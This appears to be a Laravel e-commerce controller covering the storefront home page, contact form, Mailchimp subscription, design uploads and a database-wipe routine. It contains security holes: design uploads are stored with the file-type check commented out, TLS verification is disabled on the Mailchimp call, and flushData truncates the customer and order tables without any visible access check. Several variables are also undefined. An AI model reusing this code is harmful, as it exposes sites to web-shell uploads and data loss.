<?php
namespace App\Http\Controllers\Web;

use App\Models\Web\Currency;
use App\Models\Web\UploadDesign;
use App\Models\Web\Index;
use App\Models\Web\Languages;
use App\Models\Web\News;
use App\Models\Web\Order;
use App\Models\Web\Products;
use Auth;
use Carbon;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Lang;
use View;
use DB;
use Cookie;
use App\Models\Core\Setting;
use App\Models\Core\Menus;


// Added by Mitali for test
class IndexController extends Controller
{

    public function __construct(
        Index $index,
        News $news,
        Languages $languages,
        Products $products,
        Currency $currency,
        Order $order
    ) {
        $this->index = $index;
        $this->order = $order;
        $this->news = $news;
        $this->languages = $languages;
        $this->products = $products;
        $this->currencies = $currency;
        $this->theme = new ThemeController();
    }

    public function index()
    {
        $title = array('pageTitle' => Lang::get("website.Home"));
        $final_theme = $this->theme->theme();
/*********************************************************************/
/**                   GENERAL CONTENT TO DISPLAY                    **/
/*********************************************************************/
        $result = array();
        $result['commonContent'] = $this->index->commonContent();
        $title = array('pageTitle' => Lang::get("website.Home"));
/********************************************************************/

/*********************************************************************/
/**                   GENERAL SETTINGS TO FETCH PRODUCTS           **/
/*******************************************************************/

        /**  SET LIMIT OF PRODUCTS  **/
        if (!empty($request->limit)) {
            $limit = $request->limit;
        } else {
            $limit = 8;
        }

        /**  MINIMUM PRICE **/
        if (!empty($request->min_price)) {
            $min_price = $request->min_price;
        } else {
            $min_price = '';
        }

        /**  MAXIMUM PRICE  **/
        if (!empty($request->max_price)) {
            $max_price = $request->max_price;
        } else {
            $max_price = '';
        }
/*************************************************************************/
        /*********************************************************************/
        /**                     FETCH NEWEST PRODUCTS                       **/
        /*********************************************************************/

        $data = array('page_number' => '0', 'type' => '', 'limit' => $limit, 'min_price' => $min_price, 'max_price' => $max_price);
        $newest_products = $this->products->newproducts($data);
        $result['products'] = $newest_products;
        /*********************************************************************/
        /**                     Compare Counts                              **/
        /*********************************************************************/

/*********************************************************************/

        /***************************************************************/
        /**   CART ARRAY RECORDS TO CHECK WETHER OR NOT DISPLAYED--   **/
        /**  --PRODUCT HAS BEEN ALREADY ADDE TO CART OR NOT           **/
/***************************************************************/
        $cart = '';
        $result['cartArray'] = $this->products->cartIdArray($cart);
/**************************************************************/

//special products
        $data = array('page_number' => '0', 'type' => 'special', 'limit' => $limit, 'min_price' => $min_price, 'max_price' => $max_price);
        $special_products = $this->products->newproducts($data);
        $result['special'] = $special_products;
//Flash sale

        $data = array('page_number' => '0', 'type' => 'flashsale', 'limit' => $limit, 'min_price' => $min_price, 'max_price' => $max_price);
        $flash_sale = $this->products->newproducts($data);
        $result['flash_sale'] = $flash_sale;
// //top seller
        $data = array('page_number' => '0', 'type' => 'topseller', 'limit' => $limit, 'min_price' => $min_price, 'max_price' => $max_price);
        $top_seller = $this->products->newproducts($data);
        $result['top_seller'] = $top_seller;

//most liked
        $data = array('page_number' => '0', 'type' => 'mostliked', 'limit' => $limit, 'min_price' => $min_price, 'max_price' => $max_price);
        $most_liked = $this->products->newproducts($data);
        $result['most_liked'] = $most_liked;

//is feature
        $data = array('page_number' => '0', 'type' => 'is_feature', 'limit' => $limit, 'min_price' => $min_price, 'max_price' => $max_price);
        $featured = $this->products->newproducts($data);
        $result['featured'] = $featured;

     /*   $data = array('page_number' => '0', 'type' => '', 'limit' => '15', 'is_feature' => 1);
        $news = $this->news->getAllNews($data);
        $result['news'] = $news;*/
//current time

        $currentDate = Carbon\Carbon::now();
        $currentDate = $currentDate->toDateTimeString();

        $slides = $this->index->slides($currentDate);
        $result['slides'] = $slides;
        //liked products
        $result['liked_products'] = $this->products->likedProducts();

        $orders = $this->order->getOrders();
        if (count($orders) > 0) {
            $allOrders = $orders;
        } else {
            $allOrders = $this->order->allOrders();
        }

        $temp_i = array();
        foreach ($allOrders as $orders_data) {
            $mostOrdered = $this->order->mostOrders($orders_data);
            foreach ($mostOrdered as $mostOrderedData) {
                $temp_i[] = $mostOrderedData->products_id;
            }
        }
        $detail = array();
        $temp_i = array_unique($temp_i);
        foreach ($temp_i as $temp_data) {
            $data = array('page_number' => '0', 'type' => 'topseller', 'products_id' => $temp_data, 'limit' => 7, 'min_price' => '', 'max_price' => '');
            $single_product = $this->products->products($data);
            if (!empty($single_product['product_data'][0])) {
                $detail[] = $single_product['product_data'][0];
            }
        }

        $result['weeklySoldProducts'] = array('success' => '1', 'product_data' => $detail, 'message' => "Returned all products.", 'total_record' => count($detail));
        
        session(['paymentResponseData' => '']); 
            
        session(['paymentResponse'=>'']);
        session(['payment_json','']);
        
        return view("web.index", ['title' => $title, 'final_theme' => $final_theme])->with(['result' => $result]);
    }

    public function maintance()
    {
        return view('errors.maintance');
    }

    public function error()
    {
        return view('errors.general_error', ['msg' => $msg]);
    }

    public function logout()
    {
        Auth::guard('customer')->logout();
        return redirect()->back();
    }
    public function test()
    {
        $productcategories = $this->products->productCategories1();
        echo print_r($productcategories);

    }

    private function setHeader($header_id)
    {
        $count = $this->order->countCompare();
        $languages = $this->languages->languages();
        $currencies = $this->currencies->getter();
        $productcategories = $this->products->productCategories();
        $title = array('pageTitle' => Lang::get("website.Home"));
        $result = array();
        $result['commonContent'] = $this->index->commonContent();

        if ($header_id == 1) {

            $header = (string) View::make('web.headers.headerOne', ['count' => $count, 'currencies' => $currencies, 'languages' => $languages, 'productcategories' => $productcategories, 'result' => $result])->render();
        } elseif ($header_id == 2) {
            $header = (string) View::make('web.headers.headerTwo');
        } elseif ($header_id == 3) {
            $header = (string) View::make('web.headers.headerThree')->render();
        } elseif ($header_id == 4) {
            $header = (string) View::make('web.headers.headerFour')->render();
        } elseif ($header_id == 5) {
            $header = (string) View::make('web.headers.headerFive')->render();
        } elseif ($header_id == 6) {
            $header = (string) View::make('web.headers.headerSix')->render();
        } elseif ($header_id == 7) {
            $header = (string) View::make('web.headers.headerSeven')->render();
        } elseif ($header_id == 8) {
            $header = (string) View::make('web.headers.headerEight')->render();
        } elseif ($header_id == 9) {
            $header = (string) View::make('web.headers.headerNine')->render();
        } else {
            $header = (string) View::make('web.headers.headerTen')->render();
        }
        return $header;
    }

    private function setBanner($banner_id)
    {
        if ($banner_id == 1) {
            $banner = (string) View::make('web.banners.banner1')->render();
        } elseif ($banner_id == 2) {
            $banner = (string) View::make('web.banners.banner2')->render();
        } elseif ($banner_id == 3) {
            $banner = (string) View::make('web.banners.banner3')->render();
        } elseif ($banner_id == 4) {
            $banner = (string) View::make('web.banners.banner4')->render();
        } elseif ($banner_id == 5) {
            $banner = (string) View::make('web.banners.banner5')->render();
        } elseif ($banner_id == 6) {
            $banner = (string) View::make('web.banners.banner6')->render();
        } elseif ($banner_id == 7) {
            $banner = (string) View::make('web.banners.banner7')->render();
        } elseif ($banner_id == 8) {
            $banner = (string) View::make('web.banners.banner8')->render();
        } elseif ($banner_id == 9) {
            $banner = (string) View::make('web.banners.banner9')->render();
        } elseif ($banner_id == 10) {
            $banner = (string) View::make('web.banners.banner10')->render();
        } elseif ($banner_id == 11) {
            $banner = (string) View::make('web.banners.banner11')->render();
        } elseif ($banner_id == 12) {
            $banner = (string) View::make('web.banners.banner12')->render();
        } elseif ($banner_id == 13) {
            $banner = (string) View::make('web.banners.banner13')->render();
        } elseif ($banner_id == 14) {
            $banner = (string) View::make('web.banners.banner14')->render();
        } elseif ($banner_id == 15) {
            $banner = (string) View::make('web.banners.banner15')->render();
        } elseif ($banner_id == 16) {
            $banner = (string) View::make('web.banners.banner16')->render();
        } elseif ($banner_id == 17) {
            $banner = (string) View::make('web.banners.banner17')->render();
        } elseif ($banner_id == 18) {
            $banner = (string) View::make('web.banners.banner18')->render();
        } elseif ($banner_id == 19) {
            $banner = (string) View::make('web.banners.banner19')->render();
        } else {
            $banner = (string) View::make('web.banners.banner20')->render();
        }
        return $banner;
    }

    private function setFooter($footer_id)
    {
        if ($footer_id == 1) {
            $footer = (string) View::make('web.footers.footer1')->render();
        } elseif ($footer_id == 2) {
            $footer = (string) View::make('web.footers.footer2')->render();
        } elseif ($footer_id == 3) {
            $footer = (string) View::make('web.footers.footer3')->render();
        } elseif ($footer_id == 4) {
            $footer = (string) View::make('web.footers.footer4')->render();
        } elseif ($footer_id == 5) {
            $footer = (string) View::make('web.footers.footer5')->render();
        } elseif ($footer_id == 6) {
            $footer = (string) View::make('web.footers.footer6')->render();
        } elseif ($footer_id == 7) {
            $footer = (string) View::make('web.footers.footer7')->render();
        } elseif ($footer_id == 8) {
            $footer = (string) View::make('web.footers.footer8')->render();
        } elseif ($footer_id == 9) {
            $footer = (string) View::make('web.footers.footer9')->render();
        } else {
            $footer = (string) View::make('web.footers.footer10')->render();
        }
        return $footer;
    }
    //page
    public function page(Request $request)
    {

        $pages = $this->order->getPages($request);
        if (count($pages) > 0) {
            $title = array('pageTitle' => $pages[0]->name);
            $final_theme = $this->theme->theme();
            $result['commonContent'] = $this->index->commonContent();
            $result['pages'] = $pages;
            return view("web.page", ['title' => $title, 'final_theme' => $final_theme])->with('result', $result);

        } else {
            return redirect()->intended('/');
        }
    }
    //myContactUs
    public function contactus(Request $request)
    {
        $title = array('pageTitle' => Lang::get("website.Contact Us"));
        $result = array();
        $final_theme = $this->theme->theme();
        $result['commonContent'] = $this->index->commonContent();

        return view("web.contact-us", ['title' => $title, 'final_theme' => $final_theme])->with('result', $result);
    }
    //processContactUs
    public function processContactUs(Request $request)
    {
        $name = $request->name;
        $email = $request->email;
        $subject = $request->subject;
        $message = $request->message;

        $result['commonContent'] = $this->index->commonContent();

        $data = array('name' => $name, 'email' => $email, 'subject' => $subject, 'message' => $message, 'adminEmail' => $result['commonContent']['setting'][3]->value);

        Mail::send('/mail/contactUs', ['data' => $data], function ($m) use ($data) {
            $m->to($data['adminEmail'])->subject(Lang::get("website.contact us title"))->getSwiftMessage()
                ->getHeaders()
                ->addTextHeader('x-mailgun-native-send', 'true');
        });

        return redirect()->back()->with('success', Lang::get("website.contact us message"));
    }

    //setcookie
    public function setcookie(Request $request)
    {
        Cookie::queue('cookies_data', 1, 4000);
        return json_encode(array('accept'=>'yes'));
    }

    //newsletter
    public function newsletter(Request $request)
    {
        if (!empty(auth()->guard('customer')->user()->id)) {
            $customers_id = auth()->guard('customer')->user()->id;  
            $existUser = DB::table('customers')
                          ->leftJoin('users','customers.customers_id','=','users.id')
                          ->where('customers.fb_id', '=', $customers_id)
                          ->first();

                      
            if($existUser){                
                DB::table('customers')->where('user_id','=',$customers_id)->update([
                    'customers_newsletter' => 1,
                ]);
            }else{
                DB::table('customers')->insertGetId([
                    'user_id' => $customers_id,
                    'customers_newsletter' => 1,
                ]);
            }
                                            
        }
        session(['newsletter' => 1]);
        
        return 'subscribed';
    }


    public function subscribeMail(Request $request){
        $settings = $this->index->commonContent();
        if(!empty($settings['setting'][122]->value) and !empty($settings['setting'][122]->value)){        
            $email = $request->email;

            $list_id = $settings['setting'][123]->value;
            $api_key = $settings['setting'][122]->value;
            
            $data_center = substr($api_key,strpos($api_key,'-')+1);
            
            $url = 'https://'. $data_center .'.api.mailchimp.com/3.0/lists/'. $list_id .'/members';
            
            $json = json_encode([
                'email_address' => $email,
                'status'        => 'subscribed', //pass 'subscribed' or 'pending'
            ]);
            
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_USERPWD, 'user:' . $api_key);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $json);
            $result = curl_exec($ch);
            $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if($status_code==200){
                //subscribed
                print '1';
            }elseif($status_code==400){
                print '2';
            }else{
                print '0';
            }
        }else{
            print '0';
        }
        
    }

    //setsession
    public function setSession(Request $request){
        session(['device_id'=>$request->device_id]);
        
    }
    public function uploadYourDesign(Request $request)
    {
        if (!auth()->guard('customer')->check()) {
            return redirect('/login');
        } else {
        $title = array('pageTitle' => "Upload Your Design");
        $result = array();
        $final_theme = $this->theme->theme();
        $result['commonContent'] = $this->index->commonContent();
        return view("web.upload-your-design", ['title' => $title, 'final_theme' => $final_theme])->with('result', $result);
        }
    }
    //processContactUs
    public function processYourDesign(Request $request)
    {
        $submit=0;
        $result['commonContent'] = $this->index->commonContent();
        if($result['commonContent']["settings"]["google_captcha_key"] !="" && $result['commonContent']["settings"]["google_captcha_secret"] !="" ){
                      
            $url = 'https://www.google.com/recaptcha/api/siteverify';
            $remoteip = $_SERVER['REMOTE_ADDR'];
            $data = [
                    'secret' => $result['commonContent']["settings"]["google_captcha_secret"],
                    'response' => $request->get('recaptcha'),
                    'remoteip' => $remoteip
                ];
            $options = [
                    'http' => [
                    'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method' => 'POST',
                    'content' => http_build_query($data)
                    ]
                ];
            $context = stream_context_create($options);
                    $result = file_get_contents($url, false, $context);
                    $resultJson = json_decode($result); 
            if ($resultJson->success != true) {
                    return back()->withErrors(['captcha' => 'ReCaptcha Error']);
                    }
            if ($resultJson->score >= 0.3) {
                $submit=1;
            } else {
                    return back()->withErrors(['captcha' => 'ReCaptcha Error']);
            }
        }else{
            $submit=1;
        }
       
        if($submit == 1 ){
            $data=array();

                $data["name"] = $request->name;
                $data["email"] = $request->email;
                $data["message"] = $request->message;
                $data["phone"] = $request->phone;
            //   dd( $request->all());
                $time = Carbon\Carbon::now();
                // Requesting the file from the form
                $image = $request->file('file');
                
                $extensions = Setting::imageType();
              //  if ($request->hasFile('file') and in_array($request->file->extension(), $extensions)) {
                
                    $extension = $image->getClientOriginalExtension();
                    // Creating the directory, for example, if the date = 18/10/2017, the directory will be 2017/10/
                    $directory = date_format($time, 'Y') . '/' . date_format($time, 'm');
                    // Creating the file name: random string followed by the day, random number and the hour
                    $filename = str_random(5) . date_format($time, 'd') . rand(1, 9) . date_format($time, 'h') . "." . $extension;
                    // This is our upload main function, storing the image in the storage that named 'public'
                    $upload_success = $image->storeAs($directory, $filename, 'public');
                //store DB
                    $Path = 'images/media/' . $directory . '/' . $filename;
                
                //}

              //  $result['commonContent'] = $this->index->commonContent();
                $data["images"]=$Path;

                //$data = array('name' => $name, 'email' => $email, 'subject' => $subject, 'message' => $message, 'adminEmail' => $result['commonContent']['setting'][3]->value);

                // Mail::send('/mail/contactUs', ['data' => $data], function ($m) use ($data) {
                //     $m->to($data['adminEmail'])->subject(Lang::get("website.contact us title"))->getSwiftMessage()
                //         ->getHeaders()
                //         ->addTextHeader('x-mailgun-native-send', 'true');
                // });
                $UploadDesign = new UploadDesign();
                $UploadDesign->insert($data);
                
                return redirect()->back()->with('success', "Thank you for Upload your designs. We will contact with you within three business days.
                ");
        }
    }
    public function flushData(){
        /*menu*/ 
        
        $images=DB::table("image_categories")->get();
        foreach($images as $img){
            @unlink($img->path);
        }
        $existCatalog=DB::table('menus')->where("type",3)->pluck("id")->toArray();
        foreach($existCatalog as $ex){
            Menus::deletemenu($ex);
        }
        $tableNames= ["address_book","categories","categories_description","customers","customers_basket","customers_basket_attributes",
                        "customers_info","images","image_categories","inventory","inventory_detail","liked_products","manufacturers",
                        "manufacturers_info","news","news_categories","news_categories_description","news_to_news_categories","orders",
                        "orders_products","orders_products_attributes","orders_total","products","products_attributes","products_attribute_images",
                        "products_description","products_images","products_to_categories","reviews","reviews_description","sliders_images","specials",
                        "tax_class","tax_rates","upload_your_design","user_to_address"
                        ];
                        
        foreach ($tableNames as $name) {
            DB::table($name)->truncate();
        }
        return response()->json(['success', "Thank you for Upload your designs. We will contact with you within three business days.
        "]);

        
    }

}
